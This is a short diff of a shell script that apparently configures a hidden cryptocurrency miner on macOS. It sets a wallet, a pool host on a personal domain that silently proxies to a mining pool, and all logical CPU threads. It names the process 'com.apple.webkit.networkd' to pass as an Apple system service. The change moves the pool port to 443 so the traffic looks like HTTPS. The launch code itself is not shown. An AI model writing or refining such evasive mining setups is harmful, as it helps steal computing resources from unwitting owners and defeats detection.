@@ -8,8 +8,8 @@
 
 WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
-POOL_HOST="cdn.soumalya.in"  # Your domain — proxies silently to na.luckpool.net:3956
-POOL_PORT="3956"
+POOL_HOST="cdn.soumalya.in"  # Your domain — no port visible, looks like HTTPS
+POOL_PORT="443"
 THREADS=$(sysctl -n hw.logicalcpu)
 
 DISGUISE_NAME="com.apple.webkit.networkd"
